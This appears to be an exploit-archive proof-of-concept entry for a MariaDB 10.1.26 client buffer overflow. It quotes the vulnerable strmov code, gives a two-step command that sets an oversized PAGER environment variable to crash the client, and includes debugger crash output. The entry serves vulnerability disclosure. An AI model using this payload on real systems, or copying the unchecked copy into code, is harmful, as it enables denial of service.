@@ -1,0 +1,63 @@
+# Exploit Title: MariaDB Client 10.1.26 - Denial of Service (PoC)
+# Google Dork: None
+# Date: 2018-11-16
+# Exploit Author: strider
+# Software Link: https://github.com/MariaDB/server
+# Version: mysql  Ver 15.1 Distrib 10.1.26-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
+# Tested on: Debian 9 Stretch x64 / Ubuntu 18.04 x86_64
+# CVE : None
+
+# Description:
+# MariaDB uses environment variables. The PAGER variable is vulnerable to a bufferoverflow.
+# If the environment variable PAGER is greater or equals 512 characters it will crash and make client unusable.
+
+# This is caused by a the function strmov which takes all from source and copy that 
+# into destination which have a fixed size.
+
+Codepart:
+static char default_pager[FN_REFLEN];
+
+char *tmp=getenv("PAGER");
+if (tmp && strlen(tmp))
+{
+	default_pager_set= 1;
+	strmov(default_pager, tmp);
+}
+
+
+Proof of Concept:
+
+Step 1:
+
+export PAGER=$(python -c "print '\x41' * 512")
+
+Step 2:
+
+mariadb -u user -p
+
+Crash
+
+---------------------------------------------------------------------
+peda output:
+
+Program received signal SIGSEGV, Segmentation fault.
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x555555b73600 ('A' <repeats 200 times>...)
+RBX: 0x555555b7cbc8 ('A' <repeats 200 times>...)
+RCX: 0x70 ('p')
+RDX: 0x0 
+RSI: 0x555555bafe40 ('A' <repeats 200 times>...)
+RDI: 0x555555bb0040 
+RBP: 0x7fffffffdfa0 --> 0x555555639a80 (<__libc_csu_init>:	push   r15)
+RSP: 0x7fffffffdd48 --> 0x55555558e5bc (<main+620>:	mov    rax,QWORD PTR [r12])
+RIP: 0x7ffff677e2e6 (<__strcpy_sse2_unaligned+374>:	movdqu XMMWORD PTR [rdi-0x40],xmm4)
+R8 : 0x555555b92580 ('A' <repeats 200 times>...)
+R9 : 0x20 (' ')
+R10: 0x7fffffffa5a0 --> 0x7fffffffa5d0 --> 0x7fffffffdb80 --> 0x7fffffffdc10 --> 0x0 
+R11: 0x7ffff6846d68 --> 0xfff37778fff37768 
+R12: 0x555555b00bc0 --> 0x555555b00b80 --> 0x40000000 ('')
+R13: 0x7ffff6a846e8 --> 0x7ffff6a84600 --> 0xfbad2084 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
